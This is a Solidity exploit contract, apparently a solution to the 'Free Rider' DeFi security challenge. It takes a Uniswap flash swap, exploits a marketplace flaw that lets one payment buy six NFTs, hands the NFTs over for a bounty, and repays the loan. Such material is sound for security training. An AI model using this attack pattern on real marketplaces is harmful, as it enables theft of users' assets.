// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";

import "hardhat/console.sol";

import "./free-rider/FreeRiderNFTMarketplace.sol";
import "./free-rider/FreeRiderBuyer.sol";

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
}

contract MaliciousNFT is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderBuyer buyer;
    IWETH weth;
    IERC721 nft;

    constructor(address _pair, address _marketplace, address _buyer, address _weth, address _nft) {
        pair = IUniswapV2Pair(_pair);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        buyer = FreeRiderBuyer(_buyer);
        weth = IWETH(payable(_weth));
        nft = IERC721(_nft);
    }

    function attack() public {
        console.log("My balance: %s", address(this).balance);
        pair.swap(15 ether, 0, address(this), new bytes(uint256(1)));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        console.log("Received %s WETH from Uniswap", amount0);
        require(amount0 == 15 * 10**18, "Not enough WETH");
        weth.withdraw(amount0);
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        console.log("buyMany");
        marketplace.buyMany{value: 15*10**18}(tokenIds);
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(buyer), i);
        }
        weth.deposit{value: 16 ether}();
        weth.transfer(address(pair), 16 ether);
    }

    receive() payable external {
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) 
        external
        override
        pure
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

}